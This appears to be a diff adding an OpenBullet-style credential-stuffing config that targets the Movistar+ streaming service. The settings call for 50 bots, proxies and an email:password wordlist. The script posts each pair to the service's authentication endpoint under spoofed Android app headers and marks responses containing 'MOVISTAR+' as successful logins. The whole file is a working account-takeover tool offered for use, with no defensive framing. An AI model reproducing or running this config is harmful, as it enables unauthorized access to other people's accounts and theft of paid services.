@@ -1,0 +1,40 @@
+[SETTINGS]
+{
+  "Name": "MOVISTARPLUS",
+  "SuggestedBots": 50,
+  "LastModified": "2018-08-07T02:37:05.8326638+00:00",
+  "AdditionalInfo": "",
+  "Author": "SubAtomic",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+REQUEST POST "https://clientservices.dof6.com/vod/auth.svc/android.cell/users/authenticate" AutoRedirect=TRUE 
+  CONTENT "{\"userName\":\"<USER>\",\"password\":\"<PASS>\"}" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: application/json, text/javascript, */*; q=0.01" 
+  HEADER "User-Agent: Mozilla/5.0 (Linux; Android 4.4.2; SM-G955N Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.0.0 Mobile Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "X-Requested-With: es.plus.yomvi" 
+  HEADER "Referer: http://yomviandroid.plus.es/nmp.html" 
+  HEADER "Origin: http://yomviandroid.plus.es" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Success OR 
+    KEY "MOVISTAR+" 
+  KEYCHAIN Failure OR 
+    KEY "error" 
+FUNCTION Constant "SUCCESS" -> CAP "STATUS" 
